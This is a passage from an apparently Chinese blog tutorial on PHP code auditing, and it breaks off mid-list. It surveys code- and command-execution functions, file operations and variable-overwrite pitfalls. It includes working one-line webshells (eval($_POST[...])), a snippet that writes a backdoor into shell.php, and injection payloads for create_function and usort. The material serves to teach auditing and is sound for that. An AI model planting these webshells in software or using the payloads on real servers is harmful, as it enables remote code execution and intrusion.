      <link href="/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p><code>&lt;?php eval(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>);</span><br></pre></td></tr></table></figure><p>需要在语句末加上；</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p><code>&lt;?php assert(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不需要在语句末加上；</p><h2 id="eval和assert二者区别–注意"><a href="#eval和assert二者区别–注意" class="headerlink" title="eval和assert二者区别–注意"></a>eval和assert二者区别–注意</h2><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码</p><h2 id="preg-replace的-x2F-e模式"><a href="#preg-replace的-x2F-e模式" class="headerlink" title="preg_replace的&#x2F;e模式"></a>preg_replace的&#x2F;e模式</h2><p>php版本&lt;5.5</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/pattern/e&#x27;</span>,<span class="variable">$command</span>,<span class="variable">$value</span> );</span><br></pre></td></tr></table></figure><p>在&#x2F;e模式下，如果正则匹配成功，就会命令执行preg_replace()的第二个参数</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p><strong>PHP 7.2.0 起被<em>废弃</em>，并自 PHP 8.0.0 起被<em>移除</em></strong></p><blockquote><p>此函数在内部执行 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>，因此具有跟 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 相同的安全问题。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$b</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>当<code>$b=1;&#125;phpinfo();/*</code>时</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;  </span></span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="comment">/*&#125;  </span></span><br></pre></td></tr></table></figure><p>执行了phpinfo()</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment"># 第一个参数为回调函数,其余参数是回调函数的参数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>call_user_func_array()，第二个参数要为数组</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为回调函数,其余参数是回调函数的参数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><h2 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h2><p><strong>PHP&lt;7</strong></p><p>如果在一个变量后面加上一对括号，那么解释器会试图寻找名字和这个变量的值一样的一个函数，如果找到了就执行它。</p><p>所以php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;system(&#x27;whoami&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为回调函数，第二个为传入的参数数组</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>相当于执行了两次whoami命令</p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><p>参数位置换了一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为传入的参数数组,第二个参数为回调函数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$cmd</span>, <span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><h3 id="usort、uasort"><a href="#usort、uasort" class="headerlink" title="usort、uasort"></a>usort、uasort</h3><p>PHP&lt;7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;system&#x27;</span>);    <span class="comment">//xxx.php?1=1&amp;2=whoami</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);  <span class="comment">//xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span></span><br></pre></td></tr></table></figure><h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认无回显</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()和反引号</span><br><span class="line"><span class="title function_ invoke__">popen</span>()，<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认有回显</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( 命令，结果数组 ，状态码 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># 默认无回显，要想获得结果，就要输出第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># 命令执行成功的状态码为0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( 命令, 状态码 )</span><br></pre></td></tr></table></figure><p>实际上是执行了<code>sh -c &quot;command&quot;</code>命令</p><p><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( 命令, 状态码  )</span><br></pre></td></tr></table></figure><p>和<strong>system函数</strong>类似，执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-和-反引号"><a href="#shell-exec-和-反引号" class="headerlink" title="shell_exec()和 反引号"></a><strong>shell_exec()和 反引号</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( 命令 )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()函数</strong>默认无回显，通过 <strong>echo</strong> 可将执行结果输出到页面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，&#96; 也不可执行</strong></p><p>反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>函数需要两个参数，一个是执行的命令**<code>command</code><strong>，另外一个是指针文件的连接模式</strong><code>mode</code>**，有<code>r</code>和<code>w</code>代表读和写。</p><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open()函数"></a>proc_open()函数</h2><p>与<code>popen()</code>类似，只是可以开两个管道。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h1><p><a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a></p><h2 id="fopen-模式"><a href="#fopen-模式" class="headerlink" title="fopen() 模式"></a>fopen() 模式</h2><table><thead><tr><th align="left">:-</th><th>-</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td>读</td></tr><tr><td align="left"><code>r+</code></td><td>读写，前置</td></tr><tr><td align="left"><code>w</code></td><td>写入，截断</td></tr><tr><td align="left"><code>w+</code></td><td>读写，截断</td></tr><tr><td align="left"><code>a</code></td><td>写，追加</td></tr><tr><td align="left"><code>a+</code></td><td>读写，追加</td></tr></tbody></table><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;a&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="comment"># FILE_APPEND:数据追加，而不是覆盖</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,默认<span class="literal">false</span>)  <span class="literal">false</span>:才会将内容打印出来</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(filename)</span><br><span class="line">    </span><br><span class="line">命令执行</span><br></pre></td></tr></table></figure><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; has been deleted.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(源文件,目的文件)</span><br></pre></td></tr></table></figure><h2 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)等价于<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>)都是得到当前目录下的文件</span><br><span class="line">以数组的形式返回</span><br></pre></td></tr></table></figure><h2 id="查找文件或目录"><a href="#查找文件或目录" class="headerlink" title="查找文件或目录"></a>查找文件或目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob() 类似于find</span><br><span class="line">以数组的形式返回</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/image-20220730140323897-1687422810163.png" alt="image-20220730140323897"></p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li><p><code>extract()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从数组中将变量导入到当前的符号表 </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?auth=true</span></span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>import_request_variables()</code>–php&lt;5.4.0</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># G代表GET，P代表POST，C代表COOKIE</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>( <span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># xx.php?auth=1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private! &quot;</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public! &quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$$</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span> &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;hello world hello world  <span class="comment"># $&#123;$a&#125;等同于$hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存在变量覆盖Demo</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>parse_str(query,variabal)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="用户传参"><a href="#用户传参" class="headerlink" title="用户传参"></a>用户传参</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> </span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_COOKIE</span> </span><br><span class="line"><span class="variable">$_REQUEST</span> </span><br><span class="line"><span class="variable">$_FILES</span> </span><br><span class="line"><span class="variable">$_SERVER</span> </span><br><span class="line"><span class="variable">$GLOBALS</span></span><br></pre></td></tr></table></figure><h3 id="SERVER-xx"><a href="#SERVER-xx" class="headerlink" title="$_SERVER[xx]"></a>$_SERVER[xx]</h3><p>获取当前url路径的函数及服务器变量</p><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]：查询(query)的字符串</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>]：当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><h2 id="获取所有变量-x2F-函数-x2F-常量"><a href="#获取所有变量-x2F-函数-x2F-常量" class="headerlink" title="获取所有变量&#x2F;函数&#x2F;常量"></a>获取所有变量&#x2F;函数&#x2F;常量</h2><ul><li><a href="https://www.php.net/manual/zh/function.get-defined-functions.php"><strong>get_defined_functions</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-constants.php"><strong>get_defined_constants</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php"><strong>get_defined_vars</strong></a></li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>在 PHP 中，关键字（例如<code>if</code>、 <code>else</code>、<code>while</code>、 <code>echo</code>等）、类、函数和用户定义的函数不区分大小写。</p><p>但是所有变量名都区分大小写！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ECHO <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line">EcHo <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;Hello World!</span><br></pre></td></tr></table></figure><h2 id="PHP接收参数"><a href="#PHP接收参数" class="headerlink" title="PHP接收参数"></a>PHP接收参数</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102770461">https://blog.csdn.net/bylfsj/article/details/102770461</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/120502141">https://y4tacker.blog.csdn.net/article/details/120502141</a></p><p><strong>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)</strong></p><p>php从请求的url中取出参数并保存之前，对参数名的操作：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.删除参数名前的一些符号</span><br><span 